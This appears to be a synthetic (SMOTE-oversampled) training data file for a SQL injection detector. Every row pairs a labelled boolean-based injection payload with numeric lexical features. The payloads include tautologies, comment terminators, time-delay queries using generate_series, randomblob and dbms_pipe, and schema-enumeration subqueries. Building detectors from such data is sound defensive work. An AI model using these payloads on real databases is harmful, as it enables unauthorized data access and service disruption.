id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000369,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,1.4157254834477921,39.747617757805955,15.747617757805962,2.968216594112608,6.239676950492495,9.0,18.255558565119422,6.25238224219404,0.15268897911830864,0.22666144089117604,0.4621577709911711,0.1584918089993442,0.24920591926865376,0.7507940807313462,0.0,0.0,0.0,1.0,0.0,2.501588161462693,0.750794080731346,0.0,0.0,1.0,0.24920591926865365,0.7507940807313465,0.0,1.0000000000000002,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000370,attack,boolean,1   )    )     )   and 9575  =  1640--,nearest_attack_euclidean,R000078,1.0071125494845696,50.046985282727576,15.181076988502703,2.7137196009421207,3.472430795401081,12.543230965508108,26.614031135615136,7.417292386203243,0.07356931235276709,0.24459488738756946,0.5293889643698473,0.15244683588981603,0.0,0.0,1.7637846022994594,0.0,0.23621539770054054,1.2362153977005406,0.0,4.181076988502703,0.0,0.0,0.0,3.2362153977005406,0.0,0.0,0.7637846022994593,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.23621539770054062,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2362153977005406
SMOTE_000371,attack,boolean,"-6496""   )    )     )   or 1471  =  5278 and    (    (     (  ""zkoj""  =  ""zkoj",nearest_attack_euclidean,R000070,0.476759511316584,79.13591679306451,21.690204510982404,3.037146525171715,12.173878695953078,13.239181956070382,40.82612130404692,12.896734836994135,0.155257219817704,0.16580599122107686,0.5155575900306941,0.16337919893052488,0.0,3.586939347976539,1.0,0.0,0.10326516300586519,2.0,0.0,6.20653032601173,0.0,0.0,0.0,3.1032651630058647,0.0,0.8967348369941348,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000372,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,0.4284914689217278,128.92766830286138,29.216995091415843,4.277060770329775,83.71067321144554,4.000000000000002,27.14466339427723,14.072331697138615,0.6492703916446292,0.031025274151438617,0.21055078329000151,0.10915355091393059,0.0,3.0,0.0,0.0,1.0,0.07233169713861454,0.0,3.0,0.0,0.0,3.0,1.0723316971386145,0.0,1.0,0.0,0.0,0.0,0.07233169713861465,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000373,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R000121,1.117984163757956,68.81726993715571,23.4790072498748,3.6022665396077724,16.16913134364046,18.2395036249374,26.16913134364045,8.2395036249374,0.23330344934437944,0.26669655065562053,0.38150377588593914,0.11849622411406086,1.3098759062343501,0.0,1.3802481875312997,0.0,0.0,2.0,0.0,2.6197518124687003,0.0,0.0,0.30987590623435013,4.0,1.0,0.0,0.6901240937656499,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.3098759062343502,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3098759062343497
SMOTE_000374,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000053,0.21410114055462592,156.8727185928227,36.67791959794935,4.190015340341424,76.0,16.0,48.03375879384804,16.838959798974674,0.48477819035449515,0.10205856639042002,0.30584435119460607,0.10731889206047875,0.0,1.0,2.0,0.0,1.0,2.0,0.0,5.838959798974674,0.0,0.0,2.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.9194798994873367,0.0805201005126634,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000375,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000005,0.17617975590199564,28.35910712541299,15.235763480938985,3.2012960056390836,8.416053201657036,2.1109475204418793,11.637948242540787,6.1941581607732825,0.2964031346493144,0.07415625742254953,0.4080813108649062,0.22135929706322985,0.02773688011046893,1.027736880110469,0.0,1.9861315599447655,0.9861315599447655,0.013868440055234466,0.0,2.12481596049711,0.013868440055234466,0.0,0.013868440055234466,2.9861315599447655,0.013868440055234466,1.0,0.0,0.0,0.9861315599447655,0.013868440055234466,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.013868440055234466,0.0,0.0,0.0,0.013868440055234466,0.9861315599447655,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0138684400552345
SMOTE_000376,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000026,1.705082924377844,109.61031456383861,30.709279163667482,3.722943837629123,35.967011800057044,16.612372218223307,43.12783749100244,13.903093054555827,0.32957561683755815,0.1498841814426354,0.3913375406105105,0.12920266110929587,0.0,0.5484534727220867,2.0,0.0,1.0,1.4515465272779133,0.0,6.903093054555827,0.0,1.0,1.0,4.451546527277913,0.0,0.5484534727220867,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.45154652727791333,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4515465272779133
SMOTE_000377,attack,boolean,or 'unusual'   =   'unusual',nearest_attack_euclidean,R000002,2.8625379045402,39.261975472980154,15.630987736490082,3.316931484604986,19.465223222455435,1.7326116112277177,11.331529028069298,6.732611611227718,0.5164250282149931,0.032085400207920695,0.2780747251819306,0.1734148463951556,2.2673883887722828,0.0,0.8663058056138585,0.0,0.4331529028069293,1.4331529028069294,0.0,0.0,0.0,0.0,0.0,3.1657645140346466,0.5668470971930706,0.0,0.43315290280692925,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.4331529028069293,0.0,0.4331529028069293,0.43315290280692925,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2994587084207883
SMOTE_000378,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000047,0.1881928510852705,49.68491543745856,17.186795119306886,3.4940086485529096,7.0,20.249060159075846,16.249060159075846,6.186795119306886,0.1412263918155748,0.4076549792671922,0.3269541839440065,0.1241644449732265,0.062265039768961916,0.0,3.0,0.0,0.062265039768961805,2.0,0.0,1.0622650397689615,0.0,0.0,0.0,5.0622650397689615,0.06226503976896175,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000379,attack,boolean,"1'   )    )    as nxhp where 2649  =  2649 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000111,0.6187331039123188,152.3667262618054,33.71042039136284,4.1743606118406955,73.26252234817703,16.0,46.683363130902706,16.420840782725676,0.48108196860588104,0.10525962776397496,0.3059275613101712,0.10773084231997287,0.710420391362838,0.0,2.0,0.0,1.0,2.0,0.0,5.710420391362838,0.0,0.0,2.0,5.0,0.710420391362838,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000380,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ugum' like 'ugum",nearest_attack_euclidean,R000104,1.3479895316152655,148.31217462307796,31.96826193461693,4.201368086086077,81.87304773846772,8.656087311538977,39.75130150768819,18.03173806538307,0.5518073823424638,0.05834577171216755,0.2682004046747777,0.12164644127059089,4.0,0.0,0.0,0.0,1.0,1.3439126884610233,0.0,4.687825376922047,0.6878253769220467,0.0,2.6560873115389767,2.3439126884610233,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000381,attack,boolean,"1  )   where 2679  =  2679 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000128,0.519740548302113,132.49308507429262,32.0221936867003,4.163064813019589,64.59987159015137,14.826632424040362,38.653264848080724,14.413316212020181,0.48496966431378385,0.10962251255595075,0.29313026734087,0.11227755578939534,0.0,0.0,2.0,0.0,1.0,2.0,0.0,4.511096843350151,0.0,0.0,1.8044387373400606,5.09778063132997,0.0,0.0,1.0,0.0,0.0,1.0,0.90221936867003,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000382,attack,boolean,"1%""   )    )     )   and 3116  =  9088#",nearest_attack_euclidean,R000041,2.8227261235561607,38.53618298203452,14.072365964069018,2.69224504192755,3.0,9.0,20.0,6.536182982034511,0.07786197776916093,0.23358593330748273,0.5190798517944061,0.16947223712895026,0.463817017965491,0.536182982034509,0.0,0.0,0.0,1.0,0.0,3.0,0.9999999999999998,0.0,0.0,1.0,0.463817017965491,0.536182982034509,0.0,0.536182982034509,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000383,attack,boolean,-2504'   )    )     )   or 8723  =  9715,nearest_attack_euclidean,R000097,0.7673901869141517,42.67800037083205,15.570667161109386,2.958465425459023,3.339000185416019,13.785333580554692,19.107333209722654,6.446333395138675,0.07619782971466127,0.3213463797675018,0.4514855005284051,0.1509702899894319,1.0,0.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,0.4463333951386732,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000384,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",nearest_attack_euclidean,R000084,1.5323039406315688,127.13324186312192,28.626648372624388,4.21370115232939,84.0,3.6266483726243877,26.25329674524877,13.253296745248772,0.6609657216490221,0.02846365795299187,0.2064314672313578,0.1041391531666282,1.1200548821268415,1.8799451178731585,0.0,0.0,1.0,0.0,0.0,3.0,0.0,0.0,2.6266483726243863,1.0,0.3733516273756138,0.6266483726243862,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000385,attack,boolean,"1""   )    )    as wnzf where 3352  =  3352 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000067,0.302765368336463,279.22799719678414,38.92404712478155,3.7979781134817774,82.72155231457526,37.41774081370147,113.44310462915054,45.64559943935682,0.29644358132288007,0.13401642547172302,0.4061660563612121,0.1633739368441848,0.0,1.1139293128276742,1.9620235623907751,0.0,0.0,2.037976437609225,0.0,24.227858625655347,0.0,2.0379764376092244,3.848094249563101,14.37976437609225,0.0,1.0,0.9620235623907751,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.037976437609224756,0.0,0.9620235623907751,0.037976437609224756,0.037976437609224645,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.734164936735427,0.0,0.0,0.0,0.0,0.0,0.0,0.0379764376092248,0.0379764376092248,8.886070687172325
SMOTE_000386,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""gzhp""  =  ""gzhp",nearest_attack_euclidean,R000126,1.0014088853020873,123.95728288114097,31.0670652802633,4.2782304365432875,75.02434816140428,5.243912959648933,29.621956479824465,14.067065280263302,0.603704750962532,0.04316519886620239,0.239935409365791,0.11319464080547473,0.0,2.378043520175535,0.0,0.0,1.0,1.0,0.0,3.3109782399122327,0.0,0.0,2.6890217600877673,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,0.6890217600877674,0.3109782399122326,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000387,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000073,1.3635927064715416,38.71385298569896,12.896221912991193,2.917349167961236,2.0,12.0,17.01259362336269,7.70125936233627,0.05266689249508605,0.3160013549705165,0.4303009773173992,0.20103077521699816,0.701259362336269,0.29874063766373105,3.0,0.0,0.0,1.0,0.0,2.4025187246725386,0.2987406376637311,0.0,0.0,4.0,0.7012593623362691,0.29874063766373093,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000388,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000059,1.1003743951449023,134.5934934465007,30.0,3.5535493103560043,46.429985436668225,11.446251820416471,56.02800582533271,20.689250364083293,0.3380946761667024,0.08637088382793945,0.4210520303344079,0.15448240967095028,4.0,0.0,0.0,0.0,1.0,2.0,0.0,8.757001456333178,1.9999999999999998,0.6892503640832942,1.3107496359167057,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000389,attack,boolean,1' in boolean mode  )   and 5725  =  5552#,nearest_attack_euclidean,R000081,2.1855920229062984,49.49299401827486,21.0653157347488,3.692333325231004,16.68118127438862,11.72472509755449,15.72472509755449,5.362362548777245,0.3469946834940196,0.23177139432024366,0.315859200840668,0.10537472134506878,1.3405906371943113,0.0,0.0,0.0,0.0,1.3405906371943113,0.0,1.3405906371943122,0.0,0.0,0.0,2.021771911582934,1.0,0.0,0.0,0.6594093628056887,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.3405906371943113,0.0,0.34059063719431126,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.6811812743886225
SMOTE_000390,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000122,1.4870029016745818,264.2665432614866,38.0,3.818637802692019,79.21476682391145,36.08149519316815,105.51102884099106,43.45925240341592,0.2996510466903563,0.13681855424235922,0.39895314007106886,0.16457725899621567,0.5407475965840783,0.0,2.0,0.0,0.0,2.0,0.0,22.91850480683184,0.0,2.0,4.0,14.0,0.5407475965840783,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,1.0,0.0,0.45925240341592166,0.5407475965840783,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
SMOTE_000391,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000042,1.4417267376946032,130.59952514597342,30.30663500973156,3.8560952424090726,42.146445068120926,16.0,48.5331750486578,23.91990502919468,0.3223275398370089,0.12284181006779384,0.3717213989795189,0.18310925111567833,1.2265400389262426,0.0,1.3867299805368787,0.0,0.0,1.3066350097315607,0.0,10.0,0.0,2.0,1.0,8.693364990268439,0.30663500973156066,0.0,0.6933649902684393,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.0,0.0,0.30663500973156066,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.3066350097315604
SMOTE_000392,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000028,0.5417111497047238,126.85616723996237,33.7139104769086,3.819013715510546,43.85721790461828,16.142256763053766,49.7139104769086,17.14278209538172,0.3462307756242864,0.12666316445114695,0.3919006733249519,0.13520538659961479,3.0,0.0,2.0,1.0,0.0,1.1427820953817207,0.0,9.0,0.0,0.0,1.0,4.142782095381721,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.0,0.0,0.14278209538172074,0.0,0.1427820953817207,0.8572179046182793,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1427820953817207
SMOTE_000393,attack,boolean,"1'||  (  select 'hwyv' from dual where 1155  =  1155 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",nearest_attack_euclidean,R000120,1.0990921450114228,150.55626155842438,34.0,4.036868752485022,58.89065389606094,20.027336525984765,51.41640191559086,20.221869220787813,0.3902497774889813,0.13334722565061422,0.3418167094594524,0.13458628740095208,3.416401915590859,0.0,0.3890653896060938,0.0,1.0,2.0,0.0,7.610934610393906,0.0,0.8054673051969531,1.1945326948030468,6.610934610393906,1.0,0.0,0.19453269480304688,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,0.8054673051969531,1.8054673051969532,0.0,1.0,1.8054673051969532,0.8054673051969531,0.19453269480304697,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.610934610393906
SMOTE_000394,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R000136,1.8276327695803734,137.3196842064762,30.578003394801847,3.911248182451581,57.29667232466974,12.281331070132103,47.87467571947159,19.86700509220277,0.4184102031902086,0.0921128758483722,0.34658442959151675,0.1428924913699024,3.0,0.0,0.0,0.0,0.0,0.0,0.0,10.289001697400924,0.0,1.4296672324669744,2.1406655350660513,2.5780033948018457,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,3.469446951953614e-18,0.4296672324669744,0.42966723246697436,0.0,0.0,0.4296672324669743,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5703327675330259,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4296672324669744
SMOTE_000395,attack,boolean,"1'  )   as juxt where 5956  =  5956 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000144,0.41702951684882233,138.4349485092558,38.289965672837205,3.9678884238818792,43.43494850925581,23.0,53.855017163581394,18.144982836418603,0.3137177566234609,0.16615254313326736,0.38906902811565525,0.13106067212761655,3.0,0.0,2.0,1.0,0.0,2.0,0.0,9.0,0.0,0.0,1.0,5.144982836418603,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,-2.7755575615628914e-17,0.14498283641860332,0.0,1.0,0.0,0.8550171635813966,0.14498283641860338,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.1449828364186034
SMOTE_000396,attack,boolean,"1   )    )    as prnp where 4932  =  4932 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000068,1.8199143798240656,222.60468533922932,35.84496503769215,3.7636662006372763,66.3798601507686,29.042622368077474,90.53489511307644,36.64730770730682,0.2979653609350993,0.13128683258371732,0.40682283939433583,0.16392496708684753,0.0,0.42248251884607463,2.0,0.0,0.0,1.5775174811539254,0.0,19.689930075384297,0.4224825188460746,1.4224825188460746,3.422482518846075,11.267447556538224,0.0,0.4224825188460745,1.0,0.0,0.0,1.0,1.0,0.0,0.0,3.469446951953614e-18,1.0,0.0,0.0,0.5775174811539254,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.844965037692148,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.422482518846074
